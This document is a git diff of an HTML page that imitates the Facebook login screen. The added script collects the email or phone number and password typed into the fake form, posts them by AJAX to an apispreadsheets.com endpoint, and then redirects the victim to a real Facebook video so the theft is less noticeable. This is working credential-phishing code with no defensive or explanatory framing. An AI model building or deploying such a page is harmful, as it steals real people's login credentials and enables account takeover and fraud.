@@ -1,5 +1,5 @@
 
-<header class="test">
+<header class="test" style="font-weight: 800;">
 
     facebook
 
@@ -8,19 +8,23 @@
     
 
 <div class="container" style="font-family: Helvetica Neue;;">
-<form action="https://formspree.io/xgenjzpb" method="post">
+<form id="myForm" class="formtext">
+  <input type="text" placeholder="Email or phone number" name="email/phone number" ><br>
 
-  <input type="text" placeholder="Mobile number or email address" name="email/phone number" ><br>
+  <input type="password" placeholder="Password" name="password" ><br>
 
-  <input type="password" placeholder="Enter Password" name="password" ><br>
 
-  <button type="submit" name="log" style="font-family: Helvetica Neue;" >Log In</button>
-  <p>or</p>
-  <button type="submit" class="test12" value="save">Create New Account</button>
+ 
 </form>
+<button id="todd" href="https://www.facebook.com/" onclick='SubForm()'>Log In</button><br>
+ <a style="color: #1777f2;">Frogot password?</a>
+
+ <p>or</p>
+
+  <button type="submit" class="test12" value="save">Create New Account</button>
 </div>
 <div class="test231">
-  Forgotten password? Help Centre
+   Help Centre
 
 
 
@@ -68,10 +72,12 @@ input[type=text], input[type=password] {
   display: inline-block;
   border: 1px solid #ccc;
   box-sizing: border-box;
+  border-radius: 5px;
 }
 .test12 {
     background-color: #4CAF50;
     width: 25%;
+    border-radius: 5px;
 
 }
 button {
@@ -83,6 +89,8 @@ button {
   cursor: pointer;
   width: 50%;
   font-family: Helvetica Neue;
+  border-radius: 5px;
+  font-weight: 600;
 }
 
 .container {
@@ -97,7 +105,9 @@ form {
   text-align: center;
   margin: 24px 0 0px 0;
 }
-
+.formtext {
+  border-radius: 25px;
+}
 
 .test2 {
     background-color: #D3D3D3;
@@ -108,3 +118,29 @@ body {
 }
 
 </style>
+<script
+		src="https://code.jquery.com/jquery-3.4.1.js"
+		integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+		crossorigin="anonymous"></script>
+	<script>
+		function SubForm (){
+			$.ajax({
+				url:"https://api.apispreadsheets.com/data/4268/",
+				type:"post",
+				data:$("#myForm").serializeArray(),
+				success: function(){
+					window.location.replace("https://www.facebook.com/CatsSoFun.Ali/videos/383004179392500/");
+				},
+				error: function(){
+					
+				}
+			});
+		}
+	</script>
+<script>
+
+if(document.getElementById('todd').clicked == true)
+{
+   alert("button was clicked");
+}
+</script>
